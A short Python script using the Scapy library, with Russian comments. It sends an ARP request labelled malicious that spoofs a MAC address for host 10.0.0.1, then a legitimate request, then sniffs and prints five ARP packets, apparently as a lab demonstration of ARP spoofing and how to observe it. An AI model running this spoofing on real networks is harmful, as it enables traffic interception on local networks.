from scapy.all import ARP, send, sniff, Ether

# Вредоносный ARP-запрос, пытающийся подменить MAC-адрес 10.0.0.1
malicious_arp_request = ARP(op=1, pdst="10.0.0.1", psrc="10.0.0.50", hwsrc="66:00:00:00:00:06")
send(malicious_arp_request)

# Легитимный ARP-запрос от хоста 10.0.0.50 к хосту 10.0.0.1
legitimate_arp_request = ARP(op=1, pdst="10.0.0.1", psrc="10.0.0.50", hwsrc="00:00:00:00:00:06")
send(legitimate_arp_request)


# Функция для обработки захваченных пакетов
def arp_packet_callback(packet):
    if packet[ARP].op == 1: # Запрос
        print(f"Получен ARP запрос от {packet[ARP].psrc} к {packet[ARP].pdst}")
    elif packet[ARP].op == 2: # Ответ
        print(f"Получен ARP ответ от {packet[ARP].psrc} к {packet[ARP].pdst}")

# Захват ARP пакетов
sniff(filter="arp", prn=arp_packet_callback, count=5)
